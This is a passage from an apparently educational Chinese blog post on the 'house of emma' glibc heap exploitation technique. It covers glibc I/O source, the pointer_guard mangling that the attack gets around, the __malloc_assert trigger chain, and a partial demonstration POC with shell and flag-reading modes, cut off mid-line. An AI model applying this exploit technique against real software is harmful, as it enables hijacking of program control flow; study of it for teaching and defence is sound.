<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> _IO_ssize_t</span><br><span class="line">_IO_cookie_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _IO_ssize_t</span><br><span class="line">_IO_cookie_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_ssize_t n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _IO_off64_t</span><br><span class="line">_IO_cookie_seek (_IO_FILE *fp, _IO_off64_t offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">	   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">	       == <span class="number">-1</span>)</span><br><span class="line">	   || offset == (_IO_off64_t) <span class="number">-1</span>)</span><br><span class="line">	  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到上面代码的函数调用前都被<code>PTR_DEMANGLE</code>加密了，其定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure></div>

<p>这段宏定义的操作是将函数指针 <code>ROR</code> 循环右移 <code>11</code> 位然后与 <code>fs:[0x30]</code> 异或得到真正的函数地址。解密时首先异或 <code>pointer_guard</code>，然后循环左移 <code>0x11</code> 位。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sysdeps/x86_64/nptl/tls.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* 指向TCB */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;       <span class="comment">/* 指向dtv数组 */</span></span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* 指向自身  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;    <span class="comment">/* canary值 */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  <span class="comment">/* 用于保护指针 */</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>fs:[0x28]</code> 是 <code>tls</code> 上存储的 <code>canary</code>，根据 <code>tcbhead_t</code> 结构体的定义，<code>fs[0x30]</code> 是 <code>pointer_guard</code> ，用于对指针进行加密。我们可以先泄露堆地址和 <code>libc</code> 基地址，然后利用 <code>large bin attack</code> 在 <code>tls</code> 对应 <code>pointer_guard</code> 上写一个 <code>chunk</code> 地址，从而绕过指针保护。除此之外还需要让 <code>_lock</code>指向一块可写内存。</p>
<p><strong>调用链如下</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="built_in">va_start</span> (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">va_end</span> (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = stderr;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = <span class="built_in">locked_vfxprintf</span> (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf	__vfprintf_internal</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">outstring</span> ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">	     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)                          \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        const void *string_ = (String);                 \</span></span><br><span class="line"><span class="meta">        done = outstring_func(s, string_, (Len), done); \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (done &lt; 0)                                   \</span></span><br><span class="line"><span class="meta">            goto all_done;                              \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PUT(F, S, N)	_IO_sputn ((F), (S), (N))  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">outstring_func</span> <span class="params">(FILE *s, <span class="type">const</span> UCHAR_T *string, <span class="type">size_t</span> length, <span class="type">int</span> done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">assert</span> ((<span class="type">size_t</span>) done &lt;= (<span class="type">size_t</span>) INT_MAX);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>) <span class="built_in">PUT</span> (s, string, length) != (<span class="type">size_t</span>) (length))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">done_add_func</span> (length, done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>利用条件</strong>：</p>
<ul>
<li>或者可以进行任意地址写堆地址；</li>
<li>可以触发 <code>IO</code> 流操作。</li>
</ul>
<h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a><a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/126401517" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GETSHELL_MODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORW_MODE 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT! YOU CAN CHANGE THE MODE HERE</span></span><br><span class="line"><span class="type">int</span> mode = ORW_MODE;</span><br><span class="line"><span class="type">char</span>* sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> space[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHello! today let&#x27;s learn something about house of emma.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m本程序用于演示house of emma的漏洞利用原理。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHouse of emma is used for high version of glibc, it utilizes _IO_FILE struct to exploit.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mhouse of emma 适用于高版本glibc，它使用_IO_FILE结构体进行漏洞利用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSame as other way of exploitation with _IO_FILE, it also use fake _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m与其他利用_IO_FILE结构体漏洞的方法相同，它也利用了伪造的_IO_FILE结构体。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt can be triggered by function __malloc_assert, so it always go with heap vulnerabilities.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m它可以通过函数__malloc_assert触发，因此它常常与堆漏洞相联系。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mFirst we need to know the structure of _IO_FILE in glibc 2.35:\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[32m首先我们需要了解一下glibc 2.35版本下_IO_FILE结构体的内容：\n\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[33m(line 49, /libio/bits/types/struct_FILE.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstruct _IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe key element we need to forge is the *vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m其中的关键就是*vtable指针。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that we need to write correct *_lock value in our fake _IO_FILE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m值得注意的是，我们需要写入正确的*_lock指针值到伪造的_IO_FILE结构体中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe value of *_lock should be \033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m*_lock的值应该是\033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we need to know the loading base address of libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们需要知道libc的加载基地址。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35mNow let&#x27;s get loading base address of libc through the address of function puts().\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35m现在让我们通过puts()函数获取一下libc的加载基地址。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span>(*func)(<span class="type">const</span> <span class="type">char</span>*)  = puts;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function puts() is: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mputs函数的地址为: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that the loading address of libc is: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m因此libc的加载地址为: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(The offset address of function puts() is 0x80ed0)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(puts函数的偏移量为0x80ed0)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)(func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="type">size_t</span> stderr_ptr = (<span class="type">size_t</span>)(libc_base + <span class="number">0x21a860</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSince we know the libc base address, we can also know the address of pointer stderr: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m既然现在我们已经知道了libc的加载地址，我们也可以获得stderr指针的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow let&#x27;s satisfy the second prerequisite of the exploit: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面让我们构造一下这个漏洞利用的第二个前提条件: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33mGet the value of pointer_guard or change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m获取到pointer_guard的值并将其修改为一个已知值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOur house of emma has a stable call chain, and we&#x27;ll need the value to guide rip to the function we want.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们的house of emma利用方式有一条完整的函数调用链，我们需要这个pointer_guard的值来引导rip到我们想要的函数。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhere the value is used will be introduced later.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们之后将会介绍这个pointer_guard的地址在什么地方。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that\033[31m the value of pointer guard is not located in libc, while before libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m需要注意的是pointer guard的值并不在libc中，而是在libc的低地址处。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf you use pwndbg, you can see that before libc, there exists an anonymous space, with its size of 0x3000.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果使用pwndbg，你可以看到在libc前面有一个匿名的内存区域，大小为0x3000。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe tls struct is located in this anonymous area, which includes the value of pointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mtls结构体就位于这个匿名的内存空间中，它包含有pointer_guard。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo be more detail, the value of pointer_guard is located in (libc_base - 0x3000 + 0x770)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m更具体地说，pointer_guard的值应该位于(libc_base - 0x3000 + 0x770)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mActually, the name of the struct is \033[31mtcbhead_t\033[32m. Here is the structure:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m实际上，这个结构体的名字是\033[31mtcbhead_t\033[32m. 下面是它的构造:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 36, /sysdeps/x86_64/nptl/tls.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mtypedef struct\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *tcb;\t\t/* Pointer to the TCB.  Not necessarily the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t\t   thread descriptor used by libpthread.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  dtv_t *dtv;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *self;\t\t/* Pointer to the thread descriptor.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int multiple_threads;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int gscope_flag;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t sysinfo;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t stack_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t pointer_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long int unused_vgetcpu_cache[2];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Bit 0: X86_FEATURE_1_IBT.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     Bit 1: X86_FEATURE_1_SHSTK.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned int feature_1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int __glibc_unused1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Reservation of some values for the TM ABI.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_tm[4];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* GCC split stack support.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_ss;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The lowest address of shadow stack,  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long long int ssp_base;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Must be kept even if it is no longer used by glibc since programs,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     like AddressSanitizer, depend on the size of tcbhead_t.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__padding[8];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125; tcbhead_t;\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can see that the stack guard is right above the pointer guard, so we can&#x27;t absolutely change the stack_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以发现stack_guard就在pointer_guard的上面，因此我们绝对不能修改stack_guard的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mLet&#x27;s calculate the address of pointer_guard: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m让我们计算一下pointer_guard的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* pointer_guard_address = (<span class="type">size_t</span>*)(libc_base - <span 